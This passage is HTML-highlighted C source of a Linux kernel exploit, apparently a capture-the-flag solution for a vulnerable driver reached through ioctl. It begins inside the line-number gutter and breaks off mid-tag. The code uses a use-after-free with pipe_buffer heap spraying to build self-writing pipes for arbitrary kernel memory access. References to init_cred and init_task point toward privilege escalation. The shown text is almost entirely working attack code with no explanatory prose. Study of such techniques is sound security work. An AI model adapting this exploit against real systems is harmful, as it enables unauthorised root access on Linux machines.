class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUMS 200</span></span><br><span class="line"><span class="comment">// kmalloc-cg-96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUFS_SIZE 96</span></span><br><span class="line"><span class="comment">// kmalloc-cg-192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUFS_SIZE 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...) \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;\033[32m[+] &quot;</span> fmt <span class="string">&quot;\033[0m\n&quot;</span>, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">page</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_inode_info</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> *ops;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buf_operations</span> &#123;</span><br><span class="line">  <span class="built_in">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">  <span class="built_in">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> spray_pipe_fd[PIPE_SPRAY_NUMS][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> victim_idx = <span class="number">-1</span>, origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_victim_idx = <span class="number">-1</span>, snd_origin_idx = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_2 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_3 = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_pipe_idx_4 = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> info_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pipe_buffer</span> evil_pipe_buf_2, evil_pipe_buf_3, evil_pipe_buf_4;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> temp_zero_buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">water_args</span> &#123;</span><br><span class="line">  <span class="type">char</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">new_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">512</span>];</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0x44</span>, <span class="built_in">sizeof</span>(buffer));</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = buffer,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x20</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">delete_chunk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x30</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">edit_chunk</span><span class="params">(<span class="type">char</span> c)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">water_args</span> arg = &#123;</span><br><span class="line">      .buf = &amp;c,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ioctl</span>(dev_fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] error: %s&quot;</span>, msg);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">debug</span><span class="params">(<span class="type">char</span> *msg)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(msg);</span><br><span class="line">  <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;spray pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">pipe</span>(spray_pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;new chunk then free&quot;</span>);</span><br><span class="line">  <span class="built_in">new_chunk</span>();</span><br><span class="line">  <span class="comment">// debug(&quot;write chunk data D&quot;);</span></span><br><span class="line">  <span class="built_in">delete_chunk</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;get victim chunk&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i ++) &#123;</span><br><span class="line">    <span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;alloc pipe_buffer pages&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">write</span>(spray_pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;deadbeef&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;uaf change pipe-&gt;bufs-&gt;page&quot;</span>);</span><br><span class="line">  <span class="built_in">edit_chunk</span>(<span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find victim pipe&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="type">char</span> tags[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line">    <span class="built_in">memset</span>(tags, <span class="number">0</span>, <span class="built_in">sizeof</span>(tags));</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], tags, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(tags, <span class="string">&quot;deadbeef&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">      origin_idx = nr;</span><br><span class="line">      victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;succeed find victim: %d, origin: %d&quot;</span>, victim_idx, origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (victim_idx == <span class="number">-1</span> || origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;find idx&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">second_page_level_uaf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x400</span>];</span><br><span class="line">  <span class="type">size_t</span> snd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (SND_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write something to no.1 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        SND_PIPE_BUFS_SIZE * <span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.1 origin idx pipe to page-level-uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], buffer,</span><br><span class="line">       SND_PIPE_BUFS_SIZE - <span class="number">8</span> - <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[victim_idx][<span class="number">0</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;page pointer: %p\n\t\tops: %p&quot;</span>, info_pipe_buf.page,</span><br><span class="line">           info_pipe_buf.ops);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>)info_pipe_buf.page &lt; <span class="number">0xffff000000000000</span> ||</span><br><span class="line">      (<span class="type">size_t</span>)info_pipe_buf.ops &lt; <span class="number">0xffffffff81000000</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to re-hit victim page!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hit the UAF page successful&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;construct no.2 page level uaf&quot;</span>);</span><br><span class="line">  info_pipe_buf.page = (<span class="keyword">struct</span> page *)(<span class="number">0x40</span> + (<span class="type">size_t</span>)info_pipe_buf.page);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[victim_idx][<span class="number">1</span>], &amp;info_pipe_buf, <span class="built_in">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find no.2 page uaf by pipe tags&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> nr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="comment">// printf(&quot;%#x\n&quot;, nr);</span></span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUMS &amp;&amp; nr != i) &#123;</span><br><span class="line">      snd_origin_idx = nr;</span><br><span class="line">      snd_victim_idx = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe victim_idx: %d&quot;</span>, snd_victim_idx);</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;find second pipe origin_idx: %d&quot;</span>, snd_origin_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (snd_victim_idx == <span class="number">-1</span> || snd_origin_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;failed find snd pipe&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find no.2 idx sucessfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">construct_self_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">0x1000</span>];</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">page</span> *page_ptr;</span><br><span class="line">  <span class="type">size_t</span> trd_pipe_sz =</span><br><span class="line">      <span class="number">0x1000</span> * (TRD_PIPE_BUFS_SIZE / <span class="built_in">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;write to no.2 victim pipe&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="number">24</span> - <span class="number">3</span> * <span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;close no.2 origin pipe to make second page level uaf&quot;</span>);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">close</span>(spray_pipe_fd[snd_origin_idx][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == snd_origin_idx || i == victim_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fcntl</span>(spray_pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">err_exit</span>(<span class="string">&quot;fcntl() pipe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 2 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">  evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">  evil_pipe_buf.<span class="keyword">private</span> = info_pipe_buf.<span class="keyword">private</span>;</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 2 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_2 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 2: %d&quot;</span>, self_pipe_idx_2);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_2 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 2!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 3 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_3 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 3: %d&quot;</span>, self_pipe_idx_3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_3 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 3!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try hijack pipe 4 page to itself&quot;</span>);</span><br><span class="line">  evil_pipe_buf.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf.len = TRD_PIPE_BUFS_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], buffer,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[snd_victim_idx][<span class="number">1</span>], &amp;evil_pipe_buf,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;try find pipe 4 idx&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUMS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == origin_idx || i == victim_idx || i == snd_origin_idx ||</span><br><span class="line">        i == snd_victim_idx || i == self_pipe_idx_2 || i == self_pipe_idx_3) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(spray_pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="built_in">sizeof</span>(page_ptr));</span><br><span class="line">    <span class="comment">// printf(&quot;page ptr: %#lx&quot;, (size_t)page_ptr);</span></span><br><span 